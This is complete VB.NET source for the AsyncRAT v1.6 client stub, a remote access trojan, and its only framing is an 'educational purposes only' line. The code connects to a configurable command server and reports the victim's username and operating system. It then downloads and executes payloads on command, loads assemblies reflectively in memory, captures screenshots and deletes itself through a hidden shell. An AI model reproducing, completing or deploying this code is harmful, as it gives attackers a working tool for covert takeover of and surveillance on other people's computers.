Imports System.Security.Cryptography
Imports Microsoft.Win32
Imports System.Management
Imports System
Imports System.Net.Sockets
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Windows.Forms
Imports System.IO
Imports System.Net
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging
Imports System.Threading
Imports System.Security
Imports System.Text

#Const VS = True

#If Not VS Then
<Assembly: AssemblyTitle("%Title%")>
<Assembly: AssemblyDescription("%Description%")>
<Assembly: AssemblyCompany("%Company%")>
<Assembly: AssemblyProduct("%Product%")>
<Assembly: AssemblyCopyright("%Copyright%")>
<Assembly: AssemblyTrademark("%Trademark%")>
<Assembly: AssemblyFileVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: AssemblyVersion("%v1%" & "." & "%v2%" & "." & "%v3%" & "." & "%v4%")>
<Assembly: Guid("%Guid%")>
#End If


'

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

'


Namespace AsyncRAT_Stub

    Public Class Settings
#If VS Then
        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"127.0.0.1"})
        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({6603, 6604, 6605, 6606})
        Public Shared ReadOnly KEY As String = "<AsyncRAT123>"
#Else
        Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"%HOSTS%"})
        Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({%PORT%})
        Public Shared ReadOnly KEY As String = "%KEY%"
#End If
        Public Shared ReadOnly VER As String = "v1.6"
        Public Shared ReadOnly SPL As String = "<<Async|RAT>>"
    End Class


    Public Class Program

        Public Shared isConnected As Boolean = False
        Public Shared S As Socket = Nothing
        Public Shared BufferLength As Long = Nothing
        Public Shared BufferLengthReceived As Boolean = False
        Public Shared Buffer() As Byte
        Public Shared MS As MemoryStream = Nothing
        Public Shared ReadOnly SPL = Settings.SPL
        Public Shared Tick As Threading.Timer = Nothing
        Public Shared allDone As New ManualResetEvent(False)

        Public Shared Sub Main()

            'Do Something Here..




            While True
                Thread.Sleep(2.5 * 1000)
                If isConnected = False Then
                    isDisconnected()
                    Connect()
                End If
                allDone.WaitOne()
            End While

        End Sub

        Public Shared Sub Connect()

            Try

                S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

                BufferLength = 0
                Buffer = New Byte(0) {}
                MS = New MemoryStream

                S.ReceiveBufferSize = 50 * 1000
                S.SendBufferSize = 50 * 1000

                S.Connect(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)), Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))
                Debug.WriteLine("Connect : Connected")

                isConnected = True
                Send(Info)

                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)

                Dim T As New TimerCallback(AddressOf Ping)
                Tick = New Threading.Timer(T, Nothing, 30000, 30000)
            Catch ex As Exception
                Debug.WriteLine("Connect : Failed")
                isConnected = False
            Finally
                allDone.Set()
            End Try
        End Sub

        Private Shared Function Info()
            Dim OS As New Devices.ComputerInfo
            Return String.Concat("INFO", SPL, GetHash(ID), SPL, Environment.UserName, SPL,
                                 OS.OSFullName.Replace("Microsoft", Nothing),
                                 Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ",
                                 Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"),
                                 SPL, Settings.VER)
        End Function

        Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
            If isConnected = False OrElse Not S.Connected Then
                Debug.WriteLine("BeginReceive : Disconnected")
                isConnected = False
                Exit Sub
            End If
            Try
                Dim Received As Integer = S.EndReceive(ar)
                If Received > 0 Then
                    If BufferLengthReceived = False Then
                        If Buffer(0) = 0 Then
                            Debug.WriteLine("BeginReceive : Got BufferLength")
                            BufferLength = BS(MS.ToArray)
                            MS.Dispose()
                            MS = New MemoryStream

                            If BufferLength = 0 Then
                                Debug.WriteLine("BeginReceive : Got BufferLength : isNothing")
                            Else
                                Buffer = New Byte(BufferLength - 1) {}
                                BufferLengthReceived = True
                            End If
                        Else
                            Debug.WriteLine("BeginReceive : Seeking BufferLength")
                            MS.WriteByte(Buffer(0))
                        End If
                    Else
                        MS.Write(Buffer, 0, Received)
                        If (MS.Length = BufferLength) Then
                            Debug.WriteLine("BeginReceive : Received Full Packet")
                            Buffer = New Byte(0) {}
                            BufferLength = 0
                            ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf Messages.Read), MS.ToArray)
                            MS.Dispose()
                            MS = New MemoryStream
                            BufferLengthReceived = False
                        Else
                            Buffer = New Byte(BufferLength - MS.Length - 1) {}
                            Debug.WriteLine("BeginReceive : Received Full Packet : NotEqual")
                        End If
                    End If
                Else
                    Debug.WriteLine("BeginReceive : Disconnected")
                    isConnected = False
                    Exit Sub
                End If
                S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), Nothing)
            Catch ex As Exception
                Debug.WriteLine("BeginReceive : Failed")
                isConnected = False
                Exit Sub
            End Try
        End Sub

        Public Shared Sub Send(ByVal msg As String)
            If isConnected = True OrElse S.Connected Then
                Try
                    Using MS As New MemoryStream
                        Dim B As Byte() = AES_Encryptor(SB(msg))
                        Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

                        MS.Write(L, 0, L.Length)
                        MS.Write(B, 0, B.Length)

                        S.Poll(-1, SelectMode.SelectWrite)
                        S.BeginSend(MS.ToArray, 0, MS.Length, SocketFlags.None, New AsyncCallback(AddressOf EndSend), Nothing)
                    End Using
                Catch ex As Exception
                    Debug.WriteLine("Send")
                    isConnected = False
                End Try
            Else
                isConnected = False
            End If
        End Sub

        Private Shared Sub EndSend(ByVal ar As IAsyncResult)
            Try
                S.EndSend(ar)
            Catch ex As Exception
                Debug.WriteLine("EndSend")
                isConnected = False
            End Try
        End Sub

        Public Shared Sub isDisconnected()

            If Tick IsNot Nothing Then
                Try
                    Tick.Dispose()
                    Tick = Nothing
                Catch ex As Exception
                    Debug.WriteLine("Tick.Dispose")
                End Try
            End If

            If MS IsNot Nothing Then
                Try
                    MS.Close()
                    MS.Dispose()
                    MS = Nothing
                Catch ex As Exception
                    Debug.WriteLine("MS.Dispose")
                End Try
            End If

            If S IsNot Nothing Then
                Try
                    S.Close()
                    S.Dispose()
                    S = Nothing
                Catch ex As Exception
                    Debug.WriteLine("S.Dispose")
                End Try
            End If


        End Sub

        Public Shared Sub Ping()
            Try
                If isConnected = True Then
                    Send("PING?!")
                End If
            Catch ex As Exception
            End Try
        End Sub
    End Class

    Public Class Messages
        Private Shared ReadOnly SPL = Program.SPL

        Public Shared Sub Read(ByVal b As Byte())
            Try
                Dim A As String() = Split(BS(AES_Decryptor(b)), SPL)
                Select Case A(0)

                    Case "CLOSE"
                        Try
                            Program.S.Shutdown(SocketShutdown.Both)
                            Program.S.Close()
                        Catch ex As Exception
                        End Try
                        Environment.Exit(0)

                    Case "DEL"
                        SelfDelete()

                    Case "UPDATE"
                        Program.Send("RECEIVED")
                        Download(".exe", A(1), True)

                    Case "DW"
                        Program.Send("RECEIVED")
                        Download(A(1), A(2))

                    Case "RD-"
                        Program.Send("RD-")

                    Case "RD+"
                        RemoteDesktop.Capture(A(1), A(2))

                    Case "REFLECTION"
                        Program.Send("RECEIVED")
                        Reflection(A(1))

                End Select
            Catch ex As Exception
                Program.Send("Msg" + SPL + ex.Message)
            End Try
        End Sub

        Private Shared Sub Download(ByVal Name As String, ByVal Data As String, Optional Update As Boolean = False)
            Try
                Dim Temp As String = Path.GetTempFileName + Name
                File.WriteAllBytes(Temp, Convert.FromBase64String(Data))
                Thread.Sleep(500)
                Diagnostics.Process.Start(Temp)
                If Update Then
                    SelfDelete()
                End If
            Catch ex As Exception
                Program.Send("Msg" + SPL + ex.Message)
            End Try
        End Sub

        Private Shared Sub SelfDelete()
            Try
                Dim Del As New Diagnostics.ProcessStartInfo With {
                    .Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Diagnostics.Process.GetCurrentProcess.MainModule.FileName,
                    .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden,
                    .CreateNoWindow = True,
                    .FileName = "cmd.exe"
                    }

                Try
                    Program.S.Shutdown(SocketShutdown.Both)
                    Program.S.Close()
                Catch ex As Exception
                End Try

                Diagnostics.Process.Start(Del)
                Environment.Exit(0)
            Catch ex As Exception
                Program.Send("Msg" + SPL + ex.Message)
            End Try
        End Sub

        Private Delegate Function ExecuteAssembly(ByVal sender As Object, ByVal parameters As Object()) As Object
        Private Shared Sub Reflection(ByVal Str As String) 'gigajew@hf
            Try
                Dim buffer As Byte() = Convert.FromBase64String(StrReverse(Str))
                Dim parameters As Object() = Nothing
                Dim assembly As Assembly = Thread.GetDomain().Load(buffer)
                Dim entrypoint As MethodInfo = assembly.EntryPoint
                If entrypoint.GetParameters().Length > 0 Then
                    parameters = New Object() {New String() {Nothing}}
                End If

                Dim assemblyExecuteThread As Thread = New Thread(Sub()
                                                                     Thread.BeginThreadAffinity()
                                                                     Thread.BeginCriticalRegion()
                                                                     Dim executeAssembly As ExecuteAssembly = New ExecuteAssembly(AddressOf entrypoint.Invoke)
                                                                     executeAssembly(Nothing, parameters)
                                                                     Thread.EndCriticalRegion()
                                                                     Thread.EndThreadAffinity()
                                                                 End Sub)
                If parameters IsNot Nothing Then
                    If parameters.Length > 0 Then
                        assemblyExecuteThread.SetApartmentState(ApartmentState.STA)
                    Else
                        assemblyExecuteThread.SetApartmentState(ApartmentState.MTA)
                    End If
                End If

                assemblyExecuteThread.Start()
            Catch ex As Exception
                Program.Send("Msg" + SPL + ex.Message)
            End Try
        End Sub

    End Class



    Public Class RemoteDesktop

        Public Shared Sub Capture(ByVal W As Integer, ByVal H As Integer)
            Try
                Dim B As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
                Dim g As Graphics = Graphics.FromImage(B)
                g.CompositingQuality = CompositingQuality.HighSpeed
                g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)

                Dim Resize As New Bitmap(W, H)
                Dim g2 As Graphics = Graphics.FromImage(Resize)
                g2.CompositingQuality = CompositingQuality.HighSpeed
                g2.DrawImage(B, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)

                Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 50) '50 or 50+
                Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
                Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
                encoderParameters.Param(0) = encoderParameter

                Dim MS As New IO.MemoryStream
                Resize.Save(MS, encoderInfo, encoderParameters)

                Try
                    SyncLock Program.S
                        Dim Bb As Byte() = AES_Encryptor(SB(("RD+" + Program.SPL + BS(MS.ToArray))))
                        Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))
                        Using MEM As New IO.MemoryStream
                            MEM.Write(L, 0, L.Length)
                            MEM.Write(Bb, 0, Bb.Length)
                            Program.S.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
                            Program.S.Send(MEM.ToArray, 0, MEM.Length, Net.Sockets.SocketFlags.None)
                        End Using

                    End SyncLock
                Catch ex As Exception
                    Program.isConnected = False
                End Try

                Try : MS.Dispose() : Catch : End Try
                Try : g.Dispose() : Catch : End Try
                Try : g2.Dispose() : Catch : End Try
                Try : Resize.Dispose() : Catch : End Try
                Try : B.Dispose() : Catch : End Try

            Catch ex As Exception
            End Try

        End Sub

        Private Shared Function GetEncoderInfo(ByVal format As ImageFormat) As ImageCodecInfo
            Try
                Dim j As Integer
                Dim encoders() As ImageCodecInfo
                encoders = ImageCodecInfo.GetImageEncoders()

                j = 0
                While j < encoders.Length
                    If encoders(j).FormatID = format.Guid Then
                        Return encoders(j)
                    End If
                    j += 1
                End While
                Return Nothing
            Catch ex As Exception
            End Try
        End Function
    End Class


    Module Helper

        Function SB(ByVal s As String) As Byte()
            Return Encoding.Default.GetBytes(s)
        End Function

        Function BS(ByVal b As Byte()) As String
            Return Encoding.Default.GetString(b)
        End Function

        Function ID() As String
            Dim S As String = Nothing

            S += Environment.UserDomainName
            S += Environment.UserName
            S += Environment.MachineName

            Return S
        End Function

        Function GetHash(strToHash As String) As String
            Dim md5Obj As New Cryptography.MD5CryptoServiceProvider
            Dim bytesToHash() As Byte = Encoding.ASCII.GetBytes(strToHash)
            bytesToHash = md5Obj.ComputeHash(bytesToHash)
            Dim strResult As New StringBuilder
            For Each b As Byte In bytesToHash
                strResult.Append(b.ToString("x2"))
            Next
            Return strResult.ToString.Substring(0, 12).ToUpper
        End Function

        Function AES_Encryptor(ByVal input As Byte()) As Byte()
            Dim AES As New Cryptography.RijndaelManaged
            Dim Hash As New Cryptography.MD5CryptoServiceProvider
            Dim ciphertext As String = ""
            Try
                AES.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES.Mode = Cryptography.CipherMode.ECB
                Dim DESEncrypter As Cryptography.ICryptoTransform = AES.CreateEncryptor
                Dim Buffer As Byte() = input
                Return DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
            End Try
        End Function

        Function AES_Decryptor(ByVal input As Byte()) As Byte()
            Dim AES As New Cryptography.RijndaelManaged
            Dim Hash As New Cryptography.MD5CryptoServiceProvider
            Try
                AES.Key = Hash.ComputeHash(SB(Settings.KEY))
                AES.Mode = Cryptography.CipherMode.ECB
                Dim DESDecrypter As Cryptography.ICryptoTransform = AES.CreateDecryptor
                Dim Buffer As Byte() = input
                Return DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length)
            Catch ex As Exception
            End Try
        End Function
    End Module

End Namespace
